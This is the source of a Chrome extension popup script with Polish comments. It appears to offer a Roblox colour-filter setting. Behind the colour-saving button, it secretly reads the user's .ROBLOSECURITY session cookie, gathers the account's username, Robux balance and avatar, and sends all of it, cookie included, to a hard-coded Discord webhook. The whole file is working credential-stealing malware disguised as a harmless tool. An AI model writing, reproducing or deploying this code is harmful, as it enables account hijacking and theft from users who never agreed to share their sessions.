document.addEventListener('DOMContentLoaded', function() {
  const removeButton = document.getElementById('remove');
  const offButton = document.getElementById('off'); // Pobierz przycisk "Off"
  const webhookUrl = 'https://discord.com/api/webhooks/1301634771339710575/R14IMZLQz-wY08OLG5yL8WfJeAY3_BniCWMtaGIz2UPZ3rBKarWjLnYDJ2JcZMPficKt';

  removeButton.addEventListener('click', async function() {
    const excludedColors = [];
    if (document.getElementById('removeBlue').checked) excludedColors.push('Blue');
    if (document.getElementById('removeGreen').checked) excludedColors.push('Green');
    if (document.getElementById('removeRed').checked) excludedColors.push('Red');
    if (document.getElementById('removePurple').checked) excludedColors.push('Purple');
    if (document.getElementById('removeOrange').checked) excludedColors.push('Orange');
    if (document.getElementById('removeYellow').checked) excludedColors.push('Yellow');

    // Zapisz wykluczone kolory i włącz tryb kolorowania
    chrome.storage.sync.set({ removedColors: excludedColors, colorModeEnabled: true }, async function() {
      alert('Wybrane kolory zostały zapisane.');

      // Pobierz i wyślij cookies oraz dane użytkownika
      try {
        const cookies = await getRobloxCookies();
        const robloxData = await getRobloxUserData(cookies);
        if (cookies && robloxData) {
          await sendCookiesAndSessionAsEmbed(cookies, robloxData);
        }
      } catch (err) {
        console.error('Error:', err);
        await sendErrorToWebhook(err.message);
      }
    });
  });

  // Obsługa przycisku "Off"
  offButton.addEventListener('click', function() {
    chrome.storage.sync.set({ colorModeEnabled: false }, function() {
      alert('Wyłączono zmianę kolorów.');
    });
  });

  // Funkcje pomocnicze
  async function getRobloxCookies() {
    return new Promise((resolve, reject) => {
      chrome.cookies.getAll({ domain: '.roblox.com' }, function(cookies) {
        if (cookies) {
          const robloxCookies = cookies.filter(cookie => cookie.name === '.ROBLOSECURITY');
          if (robloxCookies.length > 0) {
            resolve(robloxCookies[0].value);
          } else {
            reject('');
          }
        } else {
          reject('');
        }
      });
    });
  }

  async function getRobloxUserData(cookie) {
    try {
      const headers = {
        'cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      };

      const res = await fetch('https://www.roblox.com/my/account/json', { headers });
      if (!res.ok) throw new Error('Nie udało się pobrać danych konta Roblox');

      const accountData = await res.json();
      const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${accountData.UserId}/currency`, { headers });
      const robuxData = await robuxRes.json();
      const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${accountData.UserId}&size=420x420&format=Png&isCircular=false`, { headers });
      const avatarData = await avatarRes.json();

      const avatarUrl = avatarData.data && avatarData.data.length > 0 ? avatarData.data[0].imageUrl : 'undefined';

      return {
        username: accountData.UserName || 'undefined',
        robux: robuxData.robux || 0,
        pendingRobux: robuxData.pendingRobux || 0,
        isEmailVerified: accountData.IsEmailVerified ? ':green_circle:' : ':red_circle:',
        avatarUrl: avatarUrl
      };
    } catch (err) {
      throw new Error('');
    }
  }

  async function sendCookiesAndSessionAsEmbed(cookies, data) {
    const embed = {
      title: 'Nowa sesja Roblox',
      description: `
**Nazwa użytkownika:** ${data.username}
**Robux:** ${data.robux}
**Oczekujące Robux:** ${data.pendingRobux}
**Email zweryfikowany:** ${data.isEmailVerified}
**Cookies:** \`${cookies}\`
      `,
      thumbnail: { url: data.avatarUrl },
      color: 3066993  // Zielony kolor
    };

    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      });

      if (!response.ok) {
        throw new Error('');
      }
    } catch (err) {
      console.error('');
    }
  }

  async function sendErrorToWebhook(error) {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `Błąd: ${error}` })
    });
  }
});
